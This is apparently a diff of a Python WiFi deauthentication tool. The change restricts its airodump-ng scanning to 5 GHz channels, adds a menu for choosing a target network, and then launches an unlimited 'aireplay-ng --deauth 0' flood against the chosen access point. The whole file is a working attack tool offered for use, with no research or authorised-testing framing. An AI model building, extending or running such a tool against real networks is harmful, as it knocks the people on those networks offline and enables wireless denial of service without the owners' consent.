@@ -7,7 +7,7 @@ import signal
 import sys
 
 # Global variables
-networks = []  # Store discovered networks
+networks = []  # Store discovered 5 GHz networks
 scanning = True  # Control the live scanning loop
 
 # Banner
@@ -22,7 +22,7 @@ def print_banner():
  ##:::: ##: ##:::. ##: ########:. #######:: ##:::: ##: ##:::: ##:. ######:: ##::. ##:
 ..:::::..::..:::::..::........:::.......:::..:::::..::..:::::..:::......:::..::::..::
 .....................................................................................
-DEVELOPED BY ATHUL                                              WIFI DEAUTHER VER 1.0
+DEVELOPED BY ATHUL                                      WIFI DEAUTHER VER 1.0 (5 GHZ)
 .....................................................................................
 """
     print(banner)
@@ -52,6 +52,14 @@ def enable_monitor_mode(interface):
     subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     print(f"Monitor mode enabled on {interface}.")
 
+def is_5ghz_channel(channel):
+    """Check if a channel is in the 5 GHz range."""
+    try:
+        channel = int(channel)
+        return 36 <= channel <= 165  # Common 5 GHz channel range
+    except ValueError:
+        return False
+
 def update_network_list(csv_file):
     """Parse networks from airodump-ng CSV file."""
     global networks
@@ -65,30 +73,32 @@ def update_network_list(csv_file):
                 continue
             fields = line.split(",")
             if len(fields) > 14 and fields[13].strip() != "":
-                network = {
-                    "bssid": fields[0].strip(),
-                    "channel": fields[3].strip(),
-                    "essid": fields[13].strip()
-                }
-                if network not in networks:  # Add only unique networks
-                    new_networks.append(network)
+                channel = fields[3].strip()
+                if is_5ghz_channel(channel):
+                    network = {
+                        "bssid": fields[0].strip(),
+                        "channel": channel,
+                        "essid": fields[13].strip()
+                    }
+                    if network not in networks:  # Add only unique networks
+                        new_networks.append(network)
 
     if new_networks:
         networks.extend(new_networks)
 
 def scan_networks_live(interface):
-    """Live scan for WiFi networks using a loop."""
+    """Live scan for 5 GHz WiFi networks using a loop."""
     global scanning
-    print("Scanning for networks... Press Ctrl+C to stop and select a network.")
+    print("Scanning for 5 GHz networks... Press Ctrl+C to stop.")
     try:
-        process = subprocess.Popen(["airodump-ng", "--output-format", "csv", "-w", "scan_results", interface],
+        process = subprocess.Popen(["airodump-ng", "--band", "a", "--output-format", "csv", "-w", "scan_results", interface],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         while scanning:
             time.sleep(2)  # Update every 2 seconds
             update_network_list("scan_results-01.csv")
             os.system("clear")
             print_banner()
-            print("\nAvailable Networks:")
+            print("\nAvailable 5 GHz Networks:")
             print("Index\tBSSID\t\t\tChannel\tESSID")
             for index, network in enumerate(networks):
                 print(f"{index}\t{network['bssid']}\t{network['channel']}\t{network['essid']}")
@@ -98,7 +108,7 @@ def scan_networks_live(interface):
         process.terminate()
 
 def deauth_attack(interface, bssid, channel):
-    """Perform a deauthentication attack."""
+    """Perform a deauthentication attack on the selected network."""
     print(f"Setting interface to channel {channel}...")
     subprocess.run(["iwconfig", interface, "channel", channel])
 
@@ -106,7 +116,7 @@ def deauth_attack(interface, bssid, channel):
     try:
         subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, interface])
     except KeyboardInterrupt:
-        print("Deauth attack stopped.")
+        print("\nDeauth attack stopped.")
 
 def cleanup():
     """Cleanup leftover files from airodump-ng."""
@@ -129,11 +139,35 @@ def signal_handler_exit(sig, frame):
     cleanup()
     sys.exit(0)
 
-def main():
-    # Set up signal handlers
-    signal.signal(signal.SIGINT, signal_handler_stop_scan)  # First Ctrl+C stops scanning, second exits
+def select_network():
+    """Allow the user to select a network after scanning."""
+    global networks
+    if not networks:
+        print("No networks found during scanning.")
+        return None
+    os.system("clear")
+    print_banner()
+    print("Select a network from the list below:")
+    print("Index\tBSSID\t\t\tChannel\tESSID")
+    for index, network in enumerate(networks):
+        print(f"{index}\t{network['bssid']}\t{network['channel']}\t{network['essid']}")
+    
+    while True:
+        try:
+            choice = int(input("\nEnter the index of the network to select: "))
+            if 0 <= choice < len(networks):
+                return networks[choice]
+            else:
+                print("Invalid choice. Try again.")
+        except ValueError:
+            print("Invalid input. Please enter a number.")
 
-    print_banner()  # Display the banner
+def main():
+    # Display banner at the beginning
+    print_banner()
+    # Set up signal handler for clean exit
+    signal.signal(signal.SIGINT, signal_handler_stop_scan)
+
     check_dependencies()
 
     # Get WiFi interfaces
@@ -149,7 +183,7 @@ def main():
     # Select interface
     while True:
         try:
-            choice = int(input("Select an interface to use for the attack: "))
+            choice = int(input("Select an interface to use for the scan: "))
             selected_interface = interfaces[choice]
             break
         except (ValueError, IndexError):
@@ -158,25 +192,21 @@ def main():
     # Enable monitor mode
     enable_monitor_mode(selected_interface)
 
-    # Live scan networks
+    # Start live scan for 5 GHz networks
     scan_networks_live(selected_interface)
 
-    # Select network
-    while True:
-        try:
-            choice = int(input("Select a network to deauth by index: "))
-            target = networks[choice]
-            break
-        except (ValueError, IndexError):
-            print("Invalid choice. Try again.")
-
-    # Perform deauth attack
-    deauth_attack(selected_interface, target["bssid"], target["channel"])
+    # Allow the user to select a network after scanning
+    selected_network = select_network()
+    if selected_network:
+        print("\nSelected Network:")
+        print(f"BSSID: {selected_network['bssid']}")
+        print(f"Channel: {selected_network['channel']}")
+        print(f"ESSID: {selected_network['essid']}")
+        print("\nStarting deauthentication attack...")
+        deauth_attack(selected_interface, selected_network['bssid'], selected_network['channel'])
 
     # Cleanup temporary files
     cleanup()
 
 if __name__ == "__main__":
-    # Final exit handler
-    signal.signal(signal.SIGINT, signal_handler_exit)
     main()
